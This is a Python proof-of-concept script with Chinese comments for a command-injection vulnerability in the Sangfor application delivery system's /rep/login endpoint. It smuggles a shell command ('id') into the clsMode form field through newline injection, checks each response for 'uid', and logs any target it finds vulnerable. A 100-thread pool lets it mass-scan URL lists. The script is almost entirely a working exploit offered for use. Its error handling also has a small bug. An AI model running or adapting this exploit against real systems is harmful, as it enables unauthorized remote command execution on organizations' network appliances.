
#导包
import requests,re,json,argparse,sys
from multiprocessing.dummy import Pool
#关闭警告
requests.packages.urllib3.disable_warnings()
#横幅
def banner():
    test = """ 
               
               
  _ __ ___ ___ 
 | '__/ __/ _ \
 | | | (_|  __/
 |_|  \___\___|
               
               


"""
    print(test)
#主函数
def main():
    banner()
    parser = argparse.ArgumentParser(description="深信服应用交付系统命令执行漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='url')
    parser.add_argument('-f','--file',dest='file',type=str,help='file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")




#poc函数
def poc(target):
    payload = '/rep/login'
    headers = {
        'Content-Length':'118',
        'Sec-Ch-Ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close'
            }
    data = "clsMode=cls_mode_login%0Aid%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123"
    try:
        res = requests.post(url=target + payload,verify=False,headers=headers,data=data)
        #print(type(res.text))
        if 'uid'in res.text:
            with open('result1.txt','a',encoding='utf -8') as f:
                f.write(f'[+]{target}存在漏洞 \n')
                print(f'[+]{target}存在漏洞 \n')
        else:
            f.write(f'[-]{target}不存在漏洞 \n')
    except:
        pass
    
    
#函数入口
if __name__ == '__main__':
    main()
